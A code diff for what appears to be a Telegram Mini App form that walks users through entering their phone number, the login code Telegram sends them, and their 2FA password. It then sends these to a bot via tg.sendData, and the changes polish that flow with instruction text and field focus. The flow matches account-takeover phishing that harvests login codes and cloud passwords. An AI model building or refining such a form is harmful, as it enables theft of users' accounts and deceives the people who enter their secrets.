@@ -7,6 +7,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const authForm = document.getElementById('authForm');
     const loadingSpinner = document.getElementById('loadingSpinner');
     const statusMsg = document.getElementById('statusMsg');
+    const instructionMsg = document.getElementById('instructionMsg');
     const phoneInput = document.getElementById('phoneInput');
     const codeInput = document.getElementById('codeInput');
     const twoFaInput = document.getElementById('2faInput');
@@ -81,16 +82,17 @@ document.addEventListener('DOMContentLoaded', () => {
             statusMsg.textContent = 'Проверяем код...';
             tg.HapticFeedback.impactOccurred('medium');
             
-            // Переход к 2FA после задержки, с инструкцией
+            // After verification, show instructions and 2FA field
             setTimeout(() => {
-                console.log('Transition to 2FA input');
+                console.log('Show instructions and 2FA');
                 hideLoading();
                 codeInput.classList.add('hidden');
                 twoFaInput.classList.remove('hidden');
+                instructionMsg.classList.remove('hidden');
                 submitBtn.textContent = 'Подтвердить 2FA (если требуется)';
-                statusMsg.innerHTML = 'Проверьте сообщение в чате с ботом.<br>Если 2FA требуется, введите пароль ниже и подтвердите.<br>Иначе просто закройте приложение.';
                 currentStep = '2fa';
-            }, 3000);  // 3 секунды, чтобы пользователь успел увидеть сообщение бота
+                twoFaInput.focus();
+            }, 3000);  // 3 seconds to see bot message
             return;
         }
 
@@ -100,13 +102,14 @@ document.addEventListener('DOMContentLoaded', () => {
             console.log('Sending 2FA data:', payload);
             tg.sendData(JSON.stringify(payload));
             showLoading();
-            statusMsg.textContent = 'Подтверждаем 2FA...';
+            statusMsg.textContent = 'Подтверждаем...';
             tg.HapticFeedback.impactOccurred('heavy');
             setTimeout(() => {
                 console.log('Transition to success');
                 hideLoading();
                 successMsg.classList.remove('hidden');
                 submitBtn.classList.add('hidden');
+                instructionMsg.classList.add('hidden');
                 tg.HapticFeedback.notificationOccurred('success');
                 setTimeout(() => tg.close(), 3000);
             }, 2000);
@@ -138,6 +141,7 @@ document.addEventListener('DOMContentLoaded', () => {
         twoFaInput.value = '';
         successMsg.classList.add('hidden');
         errorMsg.classList.add('hidden');
+        instructionMsg.classList.add('hidden');
         statusMsg.textContent = '';
     }
 
